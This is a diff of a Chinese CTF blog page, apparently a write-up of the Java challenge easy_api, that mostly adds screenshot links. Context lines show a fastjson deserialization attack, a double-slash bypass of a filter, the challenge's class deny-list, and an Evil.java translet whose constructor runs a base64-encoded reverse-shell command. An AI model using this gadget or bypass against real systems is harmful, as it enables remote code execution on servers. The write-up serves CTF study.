@@ -47,8 +47,15 @@
 <meta property="og:image" content="https://eddiemurphy89.github.io/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240816171350935.png">
 <meta property="og:image" content="https://eddiemurphy89.github.io/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240816171859812.png">
 <meta property="og:image" content="https://eddiemurphy89.github.io/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240816171950364.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2024/08/30/2024%E7%BE%8A%E5%9F%8E%E6%9D%AF-web/%E9%9A%BE/image-20240917145855630.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2024/08/30/2024%E7%BE%8A%E5%9F%8E%E6%9D%AF-web/%E9%9A%BE/image-20240917145919252.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2024/08/30/2024%E7%BE%8A%E5%9F%8E%E6%9D%AF-web/%E9%9A%BE/image-20240917150027163.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2024/08/30/2024%E7%BE%8A%E5%9F%8E%E6%9D%AF-web/%E9%9A%BE/image-20240917150543256.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2024/08/30/2024%E7%BE%8A%E5%9F%8E%E6%9D%AF-web/%E9%9A%BE/image-20240917150458344.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2024/08/30/2024%E7%BE%8A%E5%9F%8E%E6%9D%AF-web/%E9%9A%BE/image-20240917151643797.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2024/08/30/2024%E7%BE%8A%E5%9F%8E%E6%9D%AF-web/%E9%9A%BE/image-20240917151501140.png">
 <meta property="article:published_time" content="2024-08-16T15:45:52.000Z">
-<meta property="article:modified_time" content="2024-09-17T07:22:29.283Z">
+<meta property="article:modified_time" content="2024-09-17T07:23:15.197Z">
 <meta property="article:author" content="EddieMurphy">
 <meta property="article:tag" content="Java CTF">
 <meta name="twitter:card" content="summary_large_image">
@@ -458,22 +465,17 @@
 <p><a target="_blank" rel="noopener" href="https://www.yuque.com/misery333/sz1apr/wa9d50l7yo1p4s9g">CISCN2023西南赛区半决赛 seaclouds (yuque.com)</a></p>
 <h2 id="西湖论剑-2022-easy-api"><a href="#西湖论剑-2022-easy-api" class="headerlink" title="[西湖论剑 2022]easy_api"></a>[西湖论剑 2022]easy_api</h2><p>比较简单的一道题，主要是复习一下fj吧。</p>
 <p>先审计一下源码。</p>
-<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3>
-
+<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p><img src="/2024/08/30/2024%E7%BE%8A%E5%9F%8E%E6%9D%AF-web/%E9%9A%BE/image-20240917145855630.png" srcset="/img/loading.gif" lazyload alt="image-20240917145855630"></p>
 <p>简单的index路由，没啥好看的。</p>
-
-
+<p><img src="/2024/08/30/2024%E7%BE%8A%E5%9F%8E%E6%9D%AF-web/%E9%9A%BE/image-20240917145919252.png" srcset="/img/loading.gif" lazyload alt="image-20240917145919252"></p>
 <p>找到java反序列化入口，看下lib里都有啥：</p>
-
-
+<p><img src="/2024/08/30/2024%E7%BE%8A%E5%9F%8E%E6%9D%AF-web/%E9%9A%BE/image-20240917150027163.png" srcset="/img/loading.gif" lazyload alt="image-20240917150027163"></p>
 <p>fj1.2.48，没事了，直接打。</p>
 <p>这里有个小插曲就是绕到&#x2F;api&#x2F;test上：</p>
-
-
+<p><img src="/2024/08/30/2024%E7%BE%8A%E5%9F%8E%E6%9D%AF-web/%E9%9A%BE/image-20240917150543256.png" srcset="/img/loading.gif" lazyload alt="image-20240917150543256"></p>
 <p>其实也很简单，双斜杠就绕了：<a target="_blank" rel="noopener" href="https://blog.csdn.net/z69183787/article/details/84848751">web.xml filter 绕过匹配访问（针对jetty）_jetty权限绕过-CSDN博客</a></p>
 <p>fastjson最经典的部分是自动触发getter来getProperties加载字节码，如何触发getter可以通过JSON.parse触发，也可以通过toJSONString触发，很有意思的是JSON这个类的tostring就是toJSONString：</p>
-
-
+<p><img src="/2024/08/30/2024%E7%BE%8A%E5%9F%8E%E6%9D%AF-web/%E9%9A%BE/image-20240917150458344.png" srcset="/img/loading.gif" lazyload alt="image-20240917150458344"></p>
 <p>题目ban了<code>BadAttributeValueExpException</code>来触发tostring，也ban了JNDI的一些方法：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> Class <span class="hljs-title function_">resolveClass</span><span class="hljs-params">(ObjectStreamClass desc)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">className</span> <span class="hljs-operator">=</span> desc.getName();<br>        String[] denyClasses = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;java.lang.reflect.Proxy&quot;</span>, <span class="hljs-string">&quot;javax.management.BadAttributeValueExpException&quot;</span>, <span class="hljs-string">&quot;sun.rmi.server.UnicastRef&quot;</span>, <span class="hljs-string">&quot;sun.rmi.transport.LiveRef&quot;</span>, <span class="hljs-string">&quot;sun.rmi.transport.tcp.TCPEndpoint&quot;</span>, <span class="hljs-string">&quot;java.rmi.server.RemoteObject&quot;</span>, <span class="hljs-string">&quot;java.rmi.server.RemoteRef&quot;</span>, <span class="hljs-string">&quot;java.rmi.server.ObjID&quot;</span>, <span class="hljs-string">&quot;java.rmi.RemoteObjectInvocationHandler&quot;</span>, <span class="hljs-string">&quot;java.rmi.server.UnicastRemoteObject&quot;</span>, <span class="hljs-string">&quot;java.rmi.registry.Registry&quot;</span>&#125;;<br>        String[] var4 = denyClasses;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">var5</span> <span class="hljs-operator">=</span> denyClasses.length;<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">var6</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; var6 &lt; var5; ++var6) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">denyClass</span> <span class="hljs-operator">=</span> var4[var6];<br>            <span class="hljs-keyword">if</span> (className.startsWith(denyClass)) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidClassException</span>(<span class="hljs-string">&quot;Unauthorized deserialization attempt&quot;</span>, className);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.resolveClass(desc);<br>    &#125;<br></code></pre></td></tr></table></figure>
 
@@ -487,10 +489,8 @@
 <p>Evil.java：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Evil</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Evil</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;bash -c &#123;echo,&lt;base64反弹shell&gt;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>);<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
 
-
-
-
-
+<p><img src="/2024/08/30/2024%E7%BE%8A%E5%9F%8E%E6%9D%AF-web/%E9%9A%BE/image-20240917151643797.png" srcset="/img/loading.gif" lazyload alt="image-20240917151643797"></p>
+<p><img src="/2024/08/30/2024%E7%BE%8A%E5%9F%8E%E6%9D%AF-web/%E9%9A%BE/image-20240917151501140.png" srcset="/img/loading.gif" lazyload alt="image-20240917151501140"></p>
 <p>（未完待续….）</p>
 
                 
